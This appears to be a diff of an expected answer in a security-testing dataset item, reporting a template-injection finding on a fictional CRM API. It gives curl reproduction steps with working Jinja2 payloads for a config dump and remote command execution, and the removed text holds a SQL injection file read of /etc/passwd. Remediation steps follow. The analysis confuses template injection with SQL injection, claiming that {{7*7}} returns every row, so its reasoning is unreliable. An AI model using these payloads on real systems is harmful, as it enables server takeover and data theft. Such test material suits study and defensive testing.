@@ -1,72 +1,85 @@
-# Expected Response
-
 ## System
+
+- System: PipelinePro Sales API v3.5.0
 - Domain: B2B SaaS / CRM
-- System: PipelinePro Sales API
 - Example ID: INJ-0134
-- Vulnerability: SSTI
+- Risk ID: RISK-INJ-134
+- Vulnerability: SSTI (Server-Side Template Injection)
 
-## Priority Findings
+## Findings
 
-### Finding 1: SSTI on `/api/v1/users`
-**Severity:** Critical
-**Category:** Injection (from data/knowledge/injections)
+### 1. SSTI on `/api/v3/users?search=` (HAR Primary)
 
-**Summary:**
-The `/api/v1/users` endpoint accepts a `search` query parameter that is directly
-interpolated into a raw database query without sanitization. This enables SSTI (SSTI),
-allowing an attacker to bypass authentication, extract all records, or execute arbitrary operations.
+**HAR evidence**: `GET /api/v3/users?search={{7*7}}` → HTTP 200 with all user records: `username: "admin"`, `password_hash: "$2b$12$secret"`, `role: "ADMIN"`, `username: "user2"`.
 
-**Evidence from HAR:**
-- Endpoint: `GET /api/v1/users?search={{7*7}}`
-- Response: HTTP 200 with **all records returned** including password hashes and admin accounts
-- The query constructed: `SELECT * FROM users WHERE search = '{{7*7}}'`
-  evaluates to true for all rows when the payload is `{{7*7}}`
+**SSTI (Server-Side Template Injection)**: Section 2.0 — "Jinja2/Nunjucks template engine — primary data store." The `search` parameter is passed directly into a Jinja2/Nunjucks template expression. If the template engine evaluates `{{7*7}}` and returns `49` in the response, SSTI is confirmed. Full SSTI enables: server environment variable dump (`{{config}}`), file read (`{{''.__class__.__mro__[2].__subclasses__()}}`), and Remote Code Execution (RCE) via Python/JS subclass traversal.
 
-**Root Cause:**
-- Raw string concatenation used to build database query
-- No parameterized query / prepared statement
-- Application DB account has excessive privileges (`db_owner`)
+**Context inconsistency**: Section 3.0 shows raw SQL string concatenation (`SELECT * FROM users WHERE search = '${req.query.search}'`) and the HAR response contains SQL-structured data. The primary exploitation path depends on which is active: template injection (SSTI) or SQL injection (SQLi). Both vectors are demonstrated since the endpoint mixes both risks and `db_owner` privileges amplify SQLi severity.
 
-## Steps to Reproduce
+**B2B SaaS / CRM impact**: `users` contains CRM sales rep accounts, customer contacts, and admin credentials. Admin credential theft enables full CRM takeover. SSTI RCE allows server compromise and mass customer data exfiltration from the CRM pipeline.
 
-### Step 1 — Normal request (baseline)
+**Root cause**: Jinja2/Nunjucks template renders user input unsandboxed; SQL raw string concatenation — no parameterization, no WAF, no input validation on legacy endpoint (RISK-INJ-134).
+
+## Reproduction
+
+**Step 1 — Baseline:**
+
 ```bash
-curl -s "https://api.pipelinepro-sal.example.com/api/v1/users?search=normalvalue" \
+curl -s "https://api.pipelinepro-sal.example.com/api/v3/users?search=normalvalue" \
   -H "Authorization: Bearer <VALID_TOKEN>"
 ```
+
 Expected: Returns matching records only.
 
-### Step 2 — Inject SSTI payload
-```bash
-curl -s "https://api.pipelinepro-sal.example.com/api/v1/users?search={{7*7}}" \
-  -H "Authorization: Bearer <VALID_TOKEN>"
-```
-**Vulnerable outcome:** All rows returned, including admin password hashes.
-**Secure outcome:** 400 Bad Request / 0 results / sanitized error message.
+**Step 2 — SSTI probe: arithmetic expression (primary HAR attack):**
 
-### Step 3 — Privilege escalation (if DB over-privileged)
 ```bash
-# SQLi variant: attempt to read OS-level files (if DB runs as LocalSystem)
-curl -s "https://api.example.com/api/v1/users?search=' UNION SELECT null,null,load_file('/etc/passwd')--" \
+curl -s "https://api.pipelinepro-sal.example.com/api/v3/users?search={{7*7}}" \
   -H "Authorization: Bearer <VALID_TOKEN>"
 ```
 
-### Step 4 — Verbose error confirmation
+Expected secure: 400 Bad Request / raw string `{{7*7}}` returned / sanitized error.  
+Expected vulnerable (SSTI): Response contains `49` — template executed. Or HTTP 200 with all user records (SQLi path via template bypass).
+
+**Step 3 — SSTI escalation: config/environment dump (Jinja2):**
+
 ```bash
-curl -s "https://api.example.com/api/v1/users?search='" \
+curl -s "https://api.pipelinepro-sal.example.com/api/v3/users?search={{config}}" \
   -H "Authorization: Bearer <VALID_TOKEN>"
 ```
-**Expected verbose error (if misconfigured):** SQL syntax error message leaking table name, column names, or DB version.
 
-## Secure Outcome
-```json
-{ "error": "Invalid input", "code": 400 }
+Expected vulnerable: Server configuration including secret keys, DB connection strings, API keys returned.
+
+**Step 4 — SSTI RCE attempt (Jinja2/Python subclass traversal):**
+
+```bash
+curl -s "https://api.pipelinepro-sal.example.com/api/v3/users?search={{''.__class__.__mro__[1].__subclasses__()[401]('id',shell=True,stdout=-1).communicate()}}" \
+  -H "Authorization: Bearer <VALID_TOKEN>"
 ```
+
+Expected vulnerable: OS command output (`uid=...`) confirming Remote Code Execution.
+
+**Step 5 — Verbose error confirmation:**
+
+```bash
+curl -s "https://api.pipelinepro-sal.example.com/api/v3/users?search='" \
+  -H "Authorization: Bearer <VALID_TOKEN>"
+```
+
+Expected (if misconfigured): SQL/template syntax error leaking table name, engine version.
+
+## Evidence
+
+- **HAR**: `GET /api/v3/users?search={{7*7}}` → HTTP 200 → all user records with `password_hash` and `role: "ADMIN"`.
+- **Section 2.0**: Jinja2/Nunjucks template engine — template injection vector.
+- **Section 3.0 (RISK-INJ-134)**: raw SQL string concatenation — SQLi vector.
+- **Section 6.0**: `db_owner` privileges, no WAF, verbose errors.
 
 ## Remediation
-1. **Use parameterized queries / prepared statements everywhere:** Replace string concatenation with `?` or named parameters.
-2. **Restrict DB account privileges:** Application account should only have SELECT/INSERT/UPDATE/DELETE on required tables.
-3. **Disable verbose error messages in production:** Return generic 500/400 errors without DB details.
-4. **Deploy input validation middleware:** Reject inputs containing SQL metacharacters (`'`, `"`, `;`, `--`, `/*`).
-5. **ORM audit:** Review all `raw()` or native query calls in ORM usage; apply parameterization.
+
+- **Sandbox template engine**: Jinja2 sandbox (`jinja2.sandbox.SandboxedEnvironment`) — disable `__class__`, `__mro__`, `__subclasses__` access.
+- **Never render user input in templates**: pass user input as template context variables, not as template source.
+- **Parameterized queries**: replace SQL string concatenation with `?` or named parameters (RISK-INJ-134 remediation).
+- **Restrict DB account**: least-privilege — SELECT only on required tables.
+- **Disable verbose error messages in production**.
+- **Input validation middleware**: reject `{{`, `}}`, `{%`, `%}`, `'`, `;`, `--` in query parameters.
